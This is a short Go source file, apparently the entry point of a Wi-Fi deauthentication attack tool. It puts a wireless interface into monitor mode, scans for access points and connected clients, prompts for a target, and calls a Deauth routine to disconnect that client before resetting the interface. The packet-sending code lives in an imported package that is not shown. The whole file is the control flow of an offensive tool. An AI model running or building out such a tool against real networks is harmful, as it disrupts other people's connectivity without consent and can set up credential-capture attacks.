package main

import (
	"deauth/interfaces"
	"fmt"
)

func main() {
	// choose the interface
	iface, err := interfaces.AskInterface()
	if err != nil {
		fmt.Println("err :", err)
		return
	}
	// set the interface to monitor mode
	err = interfaces.SetMonitorMode(iface)
	if err != nil {
		fmt.Println("err :", err)
		return
	}
	// scan for access points
	iface.Scan(iface)
	// ask for the access point to deauth
	ap, err := interfaces.AskAP()
	if err != nil {
		fmt.Println("err :", err)
		return
	}
	// scan for clients connected to the access point
	iface.GetClient(ap)
	// ask for the client to deauth in the access point
	client, err := interfaces.AskClient()
	if err != nil {
		fmt.Println("err :", err)
		return
	}
	// deauth the client
	iface.Deauth(ap, client)
	// reset the interface to normal mode
	iface.Reset()
}
